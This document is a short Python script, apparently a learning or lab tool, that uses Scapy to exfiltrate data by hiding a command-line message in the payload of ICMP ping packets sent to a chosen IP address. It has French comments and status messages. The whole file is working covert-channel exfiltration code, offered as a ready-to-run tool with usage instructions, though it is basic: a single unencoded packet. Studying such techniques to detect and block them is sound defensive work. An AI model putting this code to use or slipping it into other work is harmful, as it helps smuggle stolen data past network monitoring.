from scapy.all import *
import sys

def send_icmp_exfiltration(target_ip, message):
    """
    Envoie des paquets ICMP (ping) contenant un message dans le champ de données.
    
    :param target_ip: Adresse IP de destination (où envoyer les pings)
    :param message: Chaîne de caractères à envoyer dans les paquets ICMP
    """
    try:
        print(f"[INFO] Exfiltration ICMP vers {target_ip} avec le message : {message}")
        
        # Construire un paquet ICMP avec la chaîne en tant que données
        packet = IP(dst=target_ip) / ICMP() / message
        
        # Envoyer le paquet
        send(packet, verbose=False)
        
        print(f"[SUCCESS] Paquet ICMP envoyé avec succès !")
    
    except Exception as e:
        print(f"[ERROR] Une erreur s'est produite : {e}")

def main():
    if len(sys.argv) != 3:
        print("Usage : python3 icmp_basic_exfiltr.py <IP cible> <message>")
        sys.exit(1)

    target_ip = sys.argv[1]
    message = sys.argv[2]
    
    send_icmp_exfiltration(target_ip, message)

if __name__ == "__main__":
    main()

